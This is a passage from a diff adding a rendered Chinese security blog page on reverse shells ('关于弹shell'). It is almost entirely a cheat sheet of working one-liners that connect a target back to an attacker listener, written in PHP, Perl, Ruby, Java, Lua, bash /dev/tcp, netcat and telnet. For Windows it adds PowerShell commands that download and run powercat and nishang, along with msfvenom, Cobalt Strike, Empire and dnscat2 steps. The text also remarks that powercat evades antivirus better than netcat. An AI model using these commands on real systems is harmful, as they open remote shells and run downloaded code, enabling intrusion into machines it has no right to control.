+</span></span><span class="line"><span class="cl">php -r &#39;$sock=fsockopen(&#34;IP&#34;,4444);exec(&#34;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="perl反弹" class="headerLink">
+    <a href="#perl%e5%8f%8d%e5%bc%b9" class="header-mark"></a>perl反弹</h3><p>本地作为服务器开启监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标机作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">perl -e &#39;use Socket;$i=&#34;IP&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ruby反弹" class="headerLink">
+    <a href="#ruby%e5%8f%8d%e5%bc%b9" class="header-mark"></a>ruby反弹</h3><p>本地作为服务器开启监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ruby -rsocket -e&#39;f=TCPSocket.open(&#34;IP&#34;,4444).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="java反弹" class="headerLink">
+    <a href="#java%e5%8f%8d%e5%bc%b9" class="header-mark"></a>Java反弹</h3><p>本地作为服务器开启监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="o">``</span><span class="n">exec</span><span class="o">``</span><span class="p">([</span><span class="o">``</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">``</span><span class="p">,</span><span class="o">``</span><span class="s2">&#34;-c&#34;</span><span class="o">``</span><span class="p">,</span><span class="o">``</span><span class="s2">&#34;exec 5&lt;&gt;/dev/tcp/IP/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">``</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">String</span><span class="p">[])</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">p</span><span class="p">.</span><span class="nf">waitFor</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="lua版本" class="headerLink">
+    <a href="#lua%e7%89%88%e6%9c%ac" class="header-mark"></a>lua版本</h3><p>本地作为服务器开启监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标作为客户端反弹shell</p>
+<p>lua -e &ldquo;require(&lsquo;socket&rsquo;);require(&lsquo;os&rsquo;);t=socket.tcp();t:connect(&lsquo;IP&rsquo;,&lsquo;4444&rsquo;);os.execute(&rsquo;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&rsquo;);&rdquo;</p>
+<h3 id="nc不使用-e参数反弹" class="headerLink">
+    <a href="#nc%e4%b8%8d%e4%bd%bf%e7%94%a8-e%e5%8f%82%e6%95%b0%e5%8f%8d%e5%bc%b9" class="header-mark"></a>nc不使用-e参数反弹</h3><p>本地作为服务器开启监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶标作为客户端反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mknod` `/tmp/backpipe` `p
+</span></span><span class="line"><span class="cl">/bin/sh` `0&lt;``/tmp/backpipe` `| nc IP 4444 1&gt;``/tmp/backpipe
+</span></span><span class="line"><span class="cl">/bin/bash` `-i &gt; ``/dev/tcp/IP````/4444 ``0&lt;&amp;1 2&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>```mknod<code> </code>backpipe p &amp;&amp; telnet IP 4444 0backpipe`</p>
+<h2 id="5windows下反弹shell" class="headerLink">
+    <a href="#5windows%e4%b8%8b%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>5.Windows下反弹shell</h2><h3 id="nc反弹shell" class="headerLink">
+    <a href="#nc%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>nc反弹shell</strong></h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">netcat 下载：https://eternallybored.org/misc/netcat/
+</span></span><span class="line"><span class="cl">服务端反弹：nc VPS_IP 1234 -e c:\windows\system32\cmd.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="powershell反弹" class="headerLink">
+    <a href="#powershell%e5%8f%8d%e5%bc%b9" class="header-mark"></a><strong>powershell反弹</strong></h3><p>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PS C:\WWW&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;); powercat -c VPS_IP -p 1234 -e cmd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下载到目标机器本地执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PS C:\WWW&gt; Import-Module ./powercat.ps1
+</span></span><span class="line"><span class="cl">PS C:\WWW&gt; powercat -c VPS_IP -p 1234 -e cmd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="msf反弹shell" class="headerLink">
+    <a href="#msf%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>MSF反弹shell</strong></h3><p>使用msfvenom生成相关Payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">msfvenom -l payloads | grep &#39;cmd/windows/reverse&#39;
+</span></span><span class="line"><span class="cl">msfvenom -p cmd/windows/reverse_powershell LHOST=VPS_IP LPORT=1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="cobalt-strike反弹shell" class="headerLink">
+    <a href="#cobalt-strike%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>Cobalt strike反弹shell</strong></h3><p>1、配置监听器：点击Cobalt Strike——&gt;Listeners——&gt;在下方Tab菜单Listeners，点击add。 2、生成payload：点击Attacks——&gt;Packages——&gt;Windows Executable，保存文件位置。 3、目标机执行powershell payload</p>
+<h3 id="empire反弹shell" class="headerLink">
+    <a href="#empire%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>Empire反弹shell</strong></h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">usestager windows/launcher_vbs
+</span></span><span class="line"><span class="cl">info
+</span></span><span class="line"><span class="cl">set Listener test
+</span></span><span class="line"><span class="cl">execute
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="nishang反弹shell" class="headerLink">
+    <a href="#nishang%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>nishang反弹shell</strong></h3><p>反弹TCPshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress VPS_IP -port 1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反弹UDPshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1&#39;);
+</span></span><span class="line"><span class="cl">Invoke-PowerShellUdp -Reverse -IPAddress VPS_IP -port 1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="dnscat反弹shell" class="headerLink">
+    <a href="#dnscat%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a><strong>Dnscat反弹shell</strong></h3><p>项目地址：</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/iagox86/dnscat2" target="_blank" rel="noopener noreferrer">https://github.com/iagox86/dnscat2github.com/iagox86/dnscat2</a></p>
+<p>服务端：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ruby dnscat2.rb --dns &#34;domain=lltest.com,host=xx.xx.xx.xx&#34; --no-cache -e open -e open 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目标主机：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-17&nbsp;<a class="git-hash" href="https://github.com/HEIGE-PCloud/DoIt/commit/969375dd70cd7acbf2e549364429ffcb642588c5" target="_blank" title="commit by scofield(scofield_1920@outlook.com) 969375dd70cd7acbf2e549364429ffcb642588c5: data" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>969375d</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/nc-shell/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\nc-shell.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\nc-shell.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20%E5%85%B3%E4%BA%8E%E5%BC%B9shell&body=|Field|Value|%0A|-|-|%0A|Title|%E5%85%B3%E4%BA%8E%E5%BC%B9shell|%0A|Url|http://scofield1920.github.io/nc-shell/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\nc-shell.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/nc-shell/" data-title="关于弹shell" data-hashtags="web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/nc-shell/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/nc-shell/" data-title="关于弹shell"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/nc-shell/" data-title="关于弹shell"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/nc-shell/" data-title="关于弹shell"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/nc-shell/" data-title="关于弹shell" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;关于弹shell&#34;, &#34;http://scofield1920.github.io/nc-shell/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/web_vulnerabilities_fix/" class="prev" rel="prev" title="常见Web漏洞修复"><i class="fas fa-angle-left fa-fw"></i>常见Web漏洞修复</a>
+            <a href="/xss-csrf_combination/" class="next" rel="next" title="XSS&#43;CSRF组合打法">XSS&#43;CSRF组合打法<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
